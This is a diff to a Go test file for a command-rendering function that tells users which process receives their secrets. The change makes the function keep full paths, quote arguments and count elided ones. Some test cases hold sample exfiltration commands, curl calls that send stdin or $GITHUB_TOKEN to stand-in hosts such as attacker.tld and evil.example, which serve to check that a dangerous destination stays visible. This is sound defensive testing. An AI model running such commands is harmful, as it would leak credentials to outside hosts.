@@ -160,6 +160,10 @@ func TestDescribeArgv_SkipsUninterestingAncestors(t *testing.T) {
 	}
 }
 
+// TestRenderCommand pins the run-mode contract: this line is the only place
+// the user learns which process receives the plaintext secrets, so it keeps
+// every part of the destination. The previous behaviour — basename argv[0]
+// and every path-looking argument — is the vulnerability, not a baseline.
 func TestRenderCommand(t *testing.T) {
 	cases := []struct {
 		name string
@@ -167,26 +171,101 @@ func TestRenderCommand(t *testing.T) {
 		want string
 	}{
 		{
-			name: "shortens paths",
-			argv: []string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink", "--older-than", "1"},
-			want: "python3 linear-archive.py --team PreThink --older-than 1",
+			name: "keeps the full path of the binary and its arguments",
+			argv: []string{"/usr/bin/python3", "/home/user/linear-archive.py", "--team", "PreThink"},
+			want: "/usr/bin/python3 /home/user/linear-archive.py --team PreThink",
 		},
 		{
-			name: "truncates at 120",
-			argv: []string{"cmd", strings.Repeat("x", 130)},
-			want: "cmd " + strings.Repeat("x", 115) + "…",
+			name: "keeps an attacker-controlled binary path visible",
+			argv: []string{"/tmp/.cache/pytest"},
+			want: "/tmp/.cache/pytest",
+		},
+		{
+			name: "keeps the exfiltration host visible",
+			argv: []string{"curl", "-d", "@-", "https://attacker.tld/collect"},
+			want: "curl -d @- https://attacker.tld/collect",
+		},
+		{
+			name: "keeps a sh -c payload whole and quoted as one argument",
+			argv: []string{"sh", "-c", `curl -sd "$GITHUB_TOKEN" https://evil.example/x`},
+			want: `sh -c "curl -sd \"$GITHUB_TOKEN\" https://evil.example/x"`,
+		},
+		{
+			name: "quotes an empty argument so it is not invisible",
+			argv: []string{"cmd", "", "next"},
+			want: `cmd "" next`,
+		},
+		{
+			name: "empty argv renders empty",
+			argv: nil,
+			want: "",
 		},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			got := caller.RenderCommand(tc.argv)
-			if got != tc.want {
-				t.Errorf("RenderCommand(%v) = %q, want %q", tc.argv, got, tc.want)
-			}
-			if n := len([]rune(got)); n > 120 {
-				t.Errorf("RenderCommand result has %d runes, want <= 120", n)
+			if got := caller.RenderCommand(tc.argv); got != tc.want {
+				t.Errorf("RenderCommand(%v) =\n%q\nwant\n%q", tc.argv, got, tc.want)
 			}
 		})
+	}
+}
+
+// TestRenderCommand_ElisionIsExplicit covers F10: a bare trailing "…" reads as
+// cosmetic, so an approver cannot tell that arguments were dropped. The count
+// must be present and correct.
+func TestRenderCommand_ElisionIsExplicit(t *testing.T) {
+	max := caller.MaxChildCommandForTest()
+	argv := []string{"deploy.sh", strings.Repeat("a", max-20), "--dropped-one", "--dropped-two"}
+
+	got := caller.RenderCommand(argv)
+
+	if !strings.Contains(got, "+2 more arguments") {
+		t.Errorf("elision must name how many arguments were dropped; got %q", got)
+	}
+	if strings.HasSuffix(got, "…") {
+		t.Errorf("elision must not be a bare ellipsis; got %q", got)
+	}
+	if strings.Contains(got, "--dropped-two") {
+		t.Errorf("argument past the budget should not have been rendered; got %q", got)
+	}
+
+	// Singular reads correctly too — an off-by-one in the count is exactly the
+	// kind of detail an approver would (rightly) stop trusting.
+	one := caller.RenderCommand([]string{"deploy.sh", strings.Repeat("a", max-20), "--only-dropped"})
+	if !strings.Contains(one, "+1 more argument") || strings.Contains(one, "+1 more arguments") {
+		t.Errorf("singular elision phrasing wrong; got %q", one)
+	}
+}
+
+// TestRenderCommand_NeverTruncatesArgv0 keeps the most decision-relevant
+// token whole: a path long enough to blow the budget is precisely the one
+// worth reading.
+func TestRenderCommand_NeverTruncatesArgv0(t *testing.T) {
+	max := caller.MaxChildCommandForTest()
+	long := "/tmp/" + strings.Repeat("d/", max) + "evil"
+	argv := []string{long, "--flag"}
+
+	got := caller.RenderCommand(argv)
+
+	if !strings.HasPrefix(got, long) {
+		t.Errorf("argv[0] must render in full; got %q", got)
+	}
+	if !strings.Contains(got, "+1 more argument") {
+		t.Errorf("dropped arguments must still be counted; got %q", got)
+	}
+}
+
+// TestRenderCommand_AncestorRenderingUnchanged guards the split: the ancestor
+// path keeps its basename shortening, and the two must not be reunified.
+func TestRenderCommand_AncestorRenderingUnchanged(t *testing.T) {
+	argv := []string{"/usr/bin/python3", "/home/user/script.py", "--flag"}
+
+	ancestor := caller.RenderArgvForTest(argv)
+	if ancestor != "python3 script.py --flag" {
+		t.Errorf("ancestor rendering changed: %q", ancestor)
+	}
+	if child := caller.RenderCommand(argv); child == ancestor {
+		t.Errorf("child and ancestor renderings must differ; both = %q", child)
 	}
 }
 
